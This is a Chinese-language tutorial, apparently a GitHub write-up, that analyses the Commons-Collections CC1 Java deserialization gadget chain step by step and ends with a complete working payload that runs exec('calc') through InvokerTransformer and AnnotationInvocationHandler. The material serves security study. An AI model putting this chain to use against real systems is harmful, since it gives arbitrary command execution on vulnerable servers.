#前言

在 Java 安全研究的世界里，Commons-Collections（CC）反序列化利用链堪称绕不过去的里程碑。
从 2015 年 ysoserial 的公开，到后续各种绕过与变种的出现，CC 链几乎贯穿了整个 Java 反序列化漏洞发展的历史。
无论你是初入安全领域的研究者，还是深耕红蓝对抗的从业者，只要接触过 Java Web 安全，就一定听过“CC链”的名字。

<img width="1200" height="400" alt="commons_collections_text" src="https://github.com/user-attachments/assets/9032d067-c20b-41bf-b4f8-147f371915a1" />

#Java反序列化漏洞简介：
Java的序列化（Serialization）是将对象转换为字节流的过程，反序列化（Deserialization）则是将字节流还原为对象。反序列化漏洞的根源在于，Java在反序列化时会自动调用对象的readObject方法，而某些类在readObject或其他方法中可能执行不安全的操作。如果攻击者控制了序列化数据，就可以利用这些不安全操作触发恶意行为。

#Commons Collections库与CC链：
Apache Commons Collections是一个常用的Java库，提供了丰富的集合类和工具类。然而，某些版本的Commons Collections（如3.x系列）中存在可以被利用的特性，攻击者通过这些特性构造了多种利用链，统称为CC链。

#CC链的核心原理：
利用Commons Collections中某些类的Transformer接口或相关实现（如InvokerTransformer），在反序列化时触发方法调用。
通过链式调用，逐步构建一个可以执行任意代码的调用链。
最终目标通常是调用Runtime.getRuntime().exec()或类似方法执行恶意命令。


#CC1利用链分析：

CC1链能够被用于反序列化漏洞的根本原因是什么？

最主要的原因是因为CC1链中的transform方法

在InvokerTransfromer类 该类允许通过反射的方式条用任意方法，参数可控，并且构造函数接受方法名和参数。

transform方法执行反射调用
<img width="1115" height="554" alt="Image" src="https://github.com/user-attachments/assets/df813241-2aaa-4e2f-b592-bc65f5940177" />
在transform方法中接收一个对象，如果传入的对象不为空，那么就获取这个对象的getclass方法，然后获取方法，最后调用invoke执行方法
在InvokerTransform中接收三个参数，和transform中的参数对应，并且都是可以控制的。

Payload构造：
首先Invokertransformer接收三个参数，第一个是methodName方法名，第二个是类型，第三个是Object具体的值.
比如现在要调用Runtime执行计算器，那么原本的代码是Runtime.getRuntime.exec("calc")，
那么怎么用Invokertransform来构造？
首先new一个Invokertransformer，第一个参数就是方法名，exec。第二个参数就是类型，在后面需要传入的calc就是一个string类型，所以直接new Class[]{String.class}。第三个参数传入Object具体的值，也就是要具体执行的命令，那就是calc
<img width="599" height="36" alt="Image" src="https://github.com/user-attachments/assets/98199797-9cba-4131-b249-6bfbcfcad182" />

然后使用InvokerTransform来接收这段代码，
最后用transform方法来输入Runtime.getRuntime对象并执行传入的方法和参数
<img width="1767" height="246" alt="image" src="https://github.com/user-attachments/assets/1e0a4b78-8d01-49cf-95ac-8e26fa72aa9d" />

现在我们已经找到了这个危险的利用类，现在要开始找中间类，也就是谁调用了InvokerTransformer中的tansform方法，
最后来到TransformedMap类中的checkSetValue方法
<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/82919f09-e707-429b-a295-dba01107c129" />
这个方法首先接收一个对象，然后return一个valueTransformer.transform(value)来传入这个对象，
跟进valueTransformer
 <img width="2094" height="1470" alt="image" src="https://github.com/user-attachments/assets/40a3d78b-4cfe-4b80-9461-bb5473594dc5" />

找到构造器TransformedMap
<img width="1318" height="166" alt="image" src="https://github.com/user-attachments/assets/dedaf014-134a-4e50-b5bb-70a15257da48" />

接收三个参数，一个Map，一个keyTransformer，一个valueTransformer，
但是这个构造器使用的是protected受保护的，无法在类的外部调用，
但是在73行又提供了一个public的静态方法decorate可以用来调用TransformedMap，并接收同样的参数

Payload构造：
<img width="1801" height="375" alt="image" src="https://github.com/user-attachments/assets/ab398bce-ff82-403c-a272-894274dc72ad" />

首先new一个HashMap对象，
因为decorate的第一个参数就是接收一个map，
第二个参数是keyTransformer，但是在checkSetValue里面只调用了valueTransformer，所以直接设置为null。
第三个参数就是接收valueTransformer，也就是一个transform对象，在上一段我们构造好的InvokerTansformer同时也实现了Transformer接口，可以直接传入。
返回值是一个Map

但是现在这个checkSetValue是protected受保护的，无法直接调用
<img width="838" height="157" alt="image" src="https://github.com/user-attachments/assets/dfeeb6f4-fbc6-4441-9a31-83d66e31eee2" />

搜索用法

<img width="2094" height="1470" alt="image" src="https://github.com/user-attachments/assets/5ebf50d9-0f60-48dc-99da-9cb32b57da9a" />

来到AbstractInputCheckedMapDecorator，
这个AbstractInputCheckedMapDecorator类是TransformedMap的父类
<img width="1815" height="1470" alt="image" src="https://github.com/user-attachments/assets/3cb9d585-d99e-45eb-a98f-4a66839609c5" />
<img width="1297" height="658" alt="image" src="https://github.com/user-attachments/assets/af4cc530-081b-4019-a066-eca2fc0cafdf" />

在这个MapEntry类里面实现了这个setValue方法并调用了checkSetValue()方法，
在这段代码里可以看出，想要控制这个checkSetValue方法，就需要控制setValue方法，因为checkSetValue是protect无法直接调用，控制setValue方法需要包含value值，和获取parent。

setValue怎么调用？

传入的value是什么？

1、传入的value是什么？

setValue调用了checkSetValue，checkSetValue又调用transform。
那么在前面的代码中提到了，transform是用来接收对象的，也就是Runtime。
现在层层调用到setValue，那么setValue中的value就是用来接收Runtime的，最后作为参数传递给transform()方法。

setValue(Runtime)--->checkSetValue(Runtime)--->transform(Runtime)

2、setValue怎么调用？

我们的最终目的是调用checkSetValue，但是protect无法调用。在setValue中调用了checkSetValue，所以现在要在setValue()方法做文章。
怎么样才能调用setValue()方法

首先需要调用MapEntry
<img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/83e1f66a-b8ce-443e-adeb-890097d23ca2" />

这里需要有一个MapEntry对象，
搜索用法，发现EntrySetlterator中的next()方法调用了MapEntry

<img width="1563" height="1470" alt="image" src="https://github.com/user-attachments/assets/07a611cd-24e9-4ac3-85c6-53afac6eae90" />

再次搜索EntrySetIterator的用法，
发现是EntrySet对象的iterator()方法调用了EntrySetIterator

<img width="1563" height="1470" alt="image" src="https://github.com/user-attachments/assets/cfb90753-2e1f-4664-836b-6c7ca45edefe" />

再次搜索EntrySet的用法，
发现entrySet()方法调用了EntrySet

<img width="1563" height="1470" alt="image" src="https://github.com/user-attachments/assets/be86068f-add7-40b0-9f04-f5d2acf614c3" />

但是无法实例化对象，因为AbstractInputCheckedMapDecorator是一个抽象类。

那怎么样才能实例化entrySet()呢？

在前面提到过 AbstractInputCheckedMapDecorator是TransformedMap的父类，
那么我们可以尝试用TransformedMap这个子类来调用父类的方法，
现在看一下TransformedMap类中有没有entrySet()方法，

<img width="1563" height="1470" alt="image" src="https://github.com/user-attachments/assets/b93cabec-2a42-47ef-acf0-e5a204bfd609" />

没有这个方法，那既然没有这个方法，那在使用enrySet()方法的时候就会调用AbstractInputCheckedMapDecorator中的entrySet()方法了。
现在使用transformdeMap.entrySet()就会得到EntrySet对象，
而EntrySet对象又调用了iterator，
iterator又被EntrySetIterator调用，
然后在next()方法中又会得到MapEntry对象，
MapEntry中又使用了setValue方法并且调用了checkSetValue()方法，

<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/5723f351-668c-47e0-9945-4691d2906451" />

使用for来遍历map，transformedMap.entrySet()，
entry.setValue(Runtime.getRuntime)，最后就会层层传递，将这个Runtime.getRuntime传递到transform方法中
执行calc命令。
在前面需要map.put，随便添加点内容，只要不为空就可以了，为空的话就会跳出程序。

<img width="1555" height="1300" alt="image" src="https://github.com/user-attachments/assets/45feec6e-cddb-4b8b-b5cb-bf0a40ff0cff" />

成功弹出计算器，这条链可以用作命令执行，但是现在还没有构造完成，需要继续寻找readobject，

搜索setValue的用法，在sun.reflect.annotation下的AnnotationInvocationHandler下的一个readobject方法中调用了setValue方法

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/afd5285d-f58d-4f1f-9a1e-6d846431f524" />

这个类就是反序列化漏洞程序的入口，接下来就要开始找有什么是我们可以控制的，

看下构造器

这里接收两个参数，一个type为Class对象，第二个Map 
Map<String，Object> memberValues，
这个memberValues是我们可以直接控制的，直接把之前构造好的transformedMap传进去，
第一个 Class<? extends Annotation> type  继承了Annotation类，
这个Annotation是注解，就是平时用的@Override、@Test、@Target之类的，
但是这个AnnotationInvocationHandler不能直接获取，因为它不是public，没有写就是 default类型

<img width="1218" height="232" alt="image" src="https://github.com/user-attachments/assets/d1e02f04-6ec7-488b-a693-3f3450282f4c" />

那么只能通过反射的方式来获取AnnotationInvocationHandler

<img width="1086" height="54" alt="image" src="https://github.com/user-attachments/assets/295f1d19-da97-45d5-8e16-c9800e30ef53" />

然后获取构造器，他的构造器也不是public，
所以需要用到Declared，
构造器需要两个参数，一个Class类型，一个Map类型，

然后实例化，
最后传入参数，第二个参数是Map memberValues，传入之前构造好的transformedMap，
第一个参数是Annotation注解，尝试使用Override注解

<img width="589" height="177" alt="image" src="https://github.com/user-attachments/assets/09daa43a-b156-4c96-b417-79d4157ee99b" />

最后代码就是这样

<img width="1324" height="150" alt="image" src="https://github.com/user-attachments/assets/8fb30468-f418-43e4-9f71-cbdef4f988ac" />

但是现在这个链子还不能用


需要解决两个问题

1、Runtime对象不能序列化，怎么让他被序列化

2、需要满足AnnotationInvocationHandler里的两个if判断

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/869bb13b-2586-4505-b0dd-3c149774a96e" />

只有进入到这个if判断里面，才可以调用到setValue方法

1、如何让Runtime序列化

Runtime是不能被序列化的，但是他的Class是可以被序列化的，

尝试反射调用，
首先调用Runtime.class，
getMethod获取getRuntime，因为没有参数类型，无参方法，也就是null，
使用invoke反射调用，因为是静态无参方法，所以为null，
然后反射调用exec方法，

<img width="1039" height="177" alt="image" src="https://github.com/user-attachments/assets/2e5d2219-542a-44cb-b5ba-112510ffc422" />

那现在肯定是不行的，因为我们需要为了反序列化的时候能在readObject中触发，
所以需要将他改成invokerTransformer的格式

核心问题：

1.Runtime类没有自定义readObject方法，无法直接执行方法

2.CC1链利用InvokerTransformer的反射能力，动态调用Runtime.getRuntime()获取实例，再调用exec执行命令

3.Transformer中的transform方法允许对任意对象调用任意方法，参数可控，这是构建Payload的关键原因

Payload构建：

第一行，获取Method对象，
通过反射获取Runtime.class.getMethod("getRuntime",null)，就是Runtime.getRuntime()方法的Method对象，

参数解析：

<img width="1081" height="205" alt="image" src="https://github.com/user-attachments/assets/b8628acc-f550-44ab-a869-8ada9edee40f" />

第一个参数就是methodName  "getMethod" 就是调用 Class.getMethod方法。
第二个参数就是getMrthod的参数类型，第一个是方法名 String，第二个是参数类型数组Class[]。
第三个参数就是args，表示实际参数，方法名是"getRuntime"，参数类型数组为空，null。
最后transform(Runtime.class)对Runtime.class调用getMethod，返回Method实例，赋值给r

<img width="2244" height="139" alt="image" src="https://github.com/user-attachments/assets/1309b01d-282d-4279-9708-436c382a6c2f" />

第二行，调用getRuntime方法

使用Method.invoke执行r(即Runtime.getRuntime())，获取Runtime实例。

参数解析：
第一个参数"invoke"，调用invoke方法，
第二个参数是object对象和object数组，
第三个参数是实际参数，getRuntime无参数，
最后transform(r) 对r（Method对象）调用invoke，相当于r.invoke(null)，返回Runtime.getRuntime的实例，强转为Runtime，赋值给invoke。

第三行，执行exec方法

对invoke(Runtime实例)调用exec("calc"),执行计算器命令

参数解析
第一个参数"exec"，调用Runtime.exec方法，
第二个参数就是参数类型，接受一个string，
第三个参数就是具体的值，也就是要执行的命令，calc，
最后transform(invoke)对invoke调用exec执行Runtime.getRuntime().exec("calc")，
这样写是可以成功执行命令弹出计算器的，
但是总共调用了3次transform，那就需要3个AnnotationInvokcationHandler对象，这显然是不行的。
因为反序列化只触发一次readObject，难以支持多次独立transform，
可以通过ChainedTransformer将多步操作封装为一个Transformer，再单次触发。
那现在就可以利用ChainedTransformer来构造这一段Payload来执行Runtime。
ChainedTransformer的构造器接受一个Transformer数组，
然后利用下面的transform方法来遍历传入的数组，

<img width="2205" height="1470" alt="image" src="https://github.com/user-attachments/assets/1d83ee88-025f-46db-ac7f-2d7b56815a68" />

Payload构造：

<img width="1917" height="274" alt="image" src="https://github.com/user-attachments/assets/a5d1e633-a79d-485d-9a94-4364c7769c68" />

首先创建一个Transformer的数组，包含三个InvokerTransform实例，
第一个InvokerTransform 调用Class.getMethod("getRuntime",null)来获取Runtime.getRuntime()方法，
第二个InvokerTransform 调用invoke执行Runtime.getRuntime()，
第三个InvokerTransform 调用Runtime.getRuntime().exec()方法来执行最终命令 calc，
之后创建ChainedTransformer传入transforms数组，
最后调用transform方法来获取Runtime.class对象，
这样就只调用了1次transform来完成三步操作，
Runtime不能被序列化的问题已经解决，
现在就需要解决AnnotationInvocationHandler里的两个if判断，

debug断点调试一下

<img width="2559" height="1539" alt="image" src="https://github.com/user-attachments/assets/92074443-e2e1-490d-8a3c-1449ea57b71d" />

发现在第一个if判断里面，传入的memberType为null，
所以就直接跳出程序了，
我们的目的是执行setValue，但是连第一个if都没有进去后面的代码肯定就执行不了。

那这个memberType到底是什么？

跟踪代码

memberType是annotationType调用的memberTypes()，
annotationType又是在 434行获取的 AnnotationType.getInstance(type)，

<img width="1783" height="1470" alt="image" src="https://github.com/user-attachments/assets/ece97981-5edf-4cea-aad0-937153b1a52b" />

那这个type又是什么？

断点调试发现，这个type就是传入的@Override注解

<img width="2157" height="1470" alt="image" src="https://github.com/user-attachments/assets/7151bd73-6356-45f6-b4a0-b1c82d81a93e" />

而在@Override里面是没有属性的

<img width="1717" height="804" alt="image" src="https://github.com/user-attachments/assets/995ea414-a4d0-4732-b364-1ad5c4325540" />

但是在@Target里面有一个value()

<img width="2205" height="1470" alt="image" src="https://github.com/user-attachments/assets/f89c9133-588d-46f1-9128-e31f2ec038d6" />

再来调试，
在上面的type已经修改为了Target，
但是在下面的这个if判断里面 memberType还是为null，

<img width="2440" height="1201" alt="image" src="https://github.com/user-attachments/assets/34198102-bc4d-4ff5-ad68-f0872306fad6" />

在这个memberType的值是get(name)获取的，
而这个name又是memberValue.getKey()获取的

<img width="1953" height="504" alt="image" src="https://github.com/user-attachments/assets/10b9ecea-4119-4c45-b730-66c36ddc49b5" />

这个getKey()是什么？

这个Key就是我们在Payload中的map.put("test","test")，
其中第一个为Key，第二个为Value，
在上面我们将Override替换成了Target，

那么在Target里面有test这个东西吗？
显然没有，只有一个value，
将map.put中的key值修改为value，

<img width="1498" height="720" alt="image" src="https://github.com/user-attachments/assets/bba18173-4524-4f40-a58d-02ff4c50f4ae" />

再次断点，发现可以进入到第一个if判断了

<img width="2124" height="1126" alt="image" src="https://github.com/user-attachments/assets/1ef5f6ea-c77b-4434-b666-9d28d57f0228" />

但是现在还是不能执行代码，
我们最后要让这个setValue可控

<img width="1902" height="340" alt="image" src="https://github.com/user-attachments/assets/b086ce14-f0cb-45db-b489-596c0a1a78bc" />

但是现在这个setValue是
AnnotationTypeMismatchExceptionProxy

<img width="2205" height="1470" alt="image" src="https://github.com/user-attachments/assets/3d514ef5-54a4-4c49-b039-212076b5ee1d" />

现在需要利用到一个类，ConstantTransformer类，
在它里面的transform，可以返回ConstantTransformer构造时传入的值，
也就是说，我们在构造ConstantTransformer的时候传入Runtime.class

<img width="1992" height="1060" alt="image" src="https://github.com/user-attachments/assets/b5f9903e-1d34-4405-b29a-4bed61d81eab" />

<img width="1167" height="208" alt="image" src="https://github.com/user-attachments/assets/15fb100b-cd81-401c-8cf2-62fc93685e7c" />

最终PayLoad：

<img width="1852" height="771" alt="image" src="https://github.com/user-attachments/assets/f0fd5056-9a76-4109-a6fc-1f3306197a01" />


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> map = new HashMap();
        map.put("value", "test");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class aClass = forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");

参考链接：

https://blog.csdn.net/qq_45305211/article/details/141720808

https://www.bilibili.com/video/BV1no4y1U7E1
